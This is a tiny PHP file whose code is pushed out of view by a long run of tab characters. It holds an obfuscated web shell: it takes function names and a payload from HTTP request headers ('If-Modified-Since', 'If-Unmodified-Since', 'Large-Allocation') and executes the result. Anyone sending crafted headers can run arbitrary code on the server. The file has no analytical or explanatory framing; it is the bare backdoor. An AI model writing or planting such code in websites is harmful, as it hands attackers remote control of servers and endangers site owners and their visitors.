<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$reset=$_HEADERS['If-Modified-Since']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Large-Allocation']));$reset();}
